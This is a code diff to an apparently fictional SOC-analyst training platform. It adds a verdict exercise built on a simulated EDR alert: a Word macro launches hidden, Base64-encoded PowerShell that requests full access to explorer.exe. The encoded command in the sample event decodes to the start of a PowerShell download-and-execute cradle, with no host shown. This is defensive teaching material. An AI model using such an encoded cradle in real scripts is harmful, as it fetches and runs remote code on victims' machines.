@@ -56,7 +56,19 @@ interface FlagTask {
   xp: number;
 }
 
-type RoomTask = ReadingTask | QuestionTask | LogAnalysisTask | FlagTask;
+interface AnalystChoiceTask {
+  type: "analyst_choice";
+  id: string;
+  heading: string;
+  scenario: string;
+  event: TelemetryEvent;
+  correct_verdict: "true_positive" | "false_positive" | "escalate" | "informational";
+  explanation: string;
+  fp_trap?: string;
+  xp: number;
+}
+
+type RoomTask = ReadingTask | QuestionTask | LogAnalysisTask | FlagTask | AnalystChoiceTask;
 
 interface Room {
   id: string;
@@ -425,6 +437,62 @@ After compromising one machine, attackers move to others. A common tool is **PsE
         "MITRE ATT&CK is a publicly maintained framework cataloguing attack techniques used by real threat actors. T1003.001 specifically refers to 'OS Credential Dumping: LSASS Memory' — meaning the attacker (or their tool) accessed the LSASS process to extract credential material such as NTLM hashes or Kerberos tickets. This tag lets SOC analysts immediately understand the attacker's goal without reading raw log data.",
       xp: 35,
     },
+
+    // ── Analyst Choice: Office macro spawning PowerShell that injects into explorer.exe ──
+    {
+      type: "analyst_choice",
+      id: "cs-falcon-ac1",
+      heading: "Verdict: Word Document Spawns Encoded PowerShell That Injects Into explorer.exe",
+      scenario:
+        "At 11:42 AM, Falcon Insight generates a Critical severity detection on WKST-FINANCE07. A Microsoft Word process (opening a file named Q3_Invoice_Reconciliation.docm) spawned PowerShell, which ran a Base64-encoded command that ultimately requested full access into a running explorer.exe process. The originating .docm file has 2 detections out of 71 vendors on VirusTotal. What is your verdict?",
+      event: {
+        id: "cs-falcon-ac1-evt-001",
+        ts: "2025-09-17T11:42:08.000Z",
+        source: "edr",
+        vendor: "CrowdStrike Falcon",
+        event_type: "process_create",
+        severity: "critical",
+        hostname: "WKST-FINANCE07",
+        user_email: "l.chen@corp.local",
+        mitre_technique: "T1055",
+        mitre_tactic: "Defense Evasion",
+        description:
+          "PowerShell spawned by WINWORD.EXE executed an encoded command; Falcon observed a subsequent full-access request into a running explorer.exe process",
+        process: {
+          name: "powershell.exe",
+          pid: 6120,
+          path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          parent_name: "winword.exe",
+          parent_pid: 5560,
+          cmdline:
+            "powershell.exe -NoP -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcA",
+          user: "CORP\\l.chen",
+        },
+        raw: {
+          "crowdstrike.event_simpleName": "ProcessRollup2",
+          "crowdstrike.SeverityName": "Critical",
+          "crowdstrike.Technique": "T1055",
+          "crowdstrike.TechniqueName": "Process Injection",
+          "crowdstrike.ContextProcessName": "winword.exe",
+          "crowdstrike.ContextProcessId": "5560",
+          "crowdstrike.CommandLine":
+            "powershell.exe -NoP -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcA",
+          "crowdstrike.TargetProcessName": "explorer.exe",
+          "crowdstrike.GrantedAccess": "0x1FFFFF",
+          "crowdstrike.UserName": "CORP\\l.chen",
+          "crowdstrike.HostName": "WKST-FINANCE07",
+          "crowdstrike.ParentBaseFileName": "WINWORD.EXE",
+          "crowdstrike.FileName": "Q3_Invoice_Reconciliation.docm",
+          "crowdstrike.DetectionId": "ldt:qrt789:xyz012",
+        },
+      } satisfies TelemetryEvent,
+      correct_verdict: "true_positive",
+      explanation:
+        "Word (winword.exe) launching PowerShell is not something that happens during normal document editing — it is the signature of a malicious macro executing. The '-Enc' flag hides the true command behind a Base64 blob, a standard obfuscation technique so the command line does not reveal itself to casual log review. 'crowdstrike.GrantedAccess: 0x1FFFFF' (PROCESS_ALL_ACCESS) against explorer.exe means the process requested full control over Windows Explorer — a classic process-injection move used to hide malicious code inside a legitimate, always-running process so it blends in and survives a cursory look at the process list. The low static AV detection (2/71) does not indicate low risk: it reflects that antivirus signature matching is exactly what obfuscated macro-delivered payloads are built to evade, while Falcon's behavioural detection caught the actual malicious sequence regardless. Correct response: isolate WKST-FINANCE07, capture memory before killing the process, retrieve and detonate the .docm file safely, and reset l.chen's credentials.",
+      fp_trap:
+        "Two details might tempt an analyst toward false_positive. First, 2 out of 71 VirusTotal detections sounds reassuring — but a low static-detection score on a freshly obfuscated file says only that it has not been signature-matched before, not that it is safe; it is the expected result for a brand-new malicious macro, not evidence of innocence. Second, PROCESS_ALL_ACCESS handles do occasionally appear from legitimate debugging or remote-support tooling, so GrantedAccess 0x1FFFFF is not damning in total isolation. What removes the ambiguity is the full chain: an Office process spawning a script interpreter (never legitimate), using Base64 obfuscation (never legitimate for routine tasks), requesting full access into a mainstream process with no debugging purpose. No single field proves this alone — the sequence does.",
+      xp: 30,
+    } satisfies AnalystChoiceTask,
   ],
 };
 
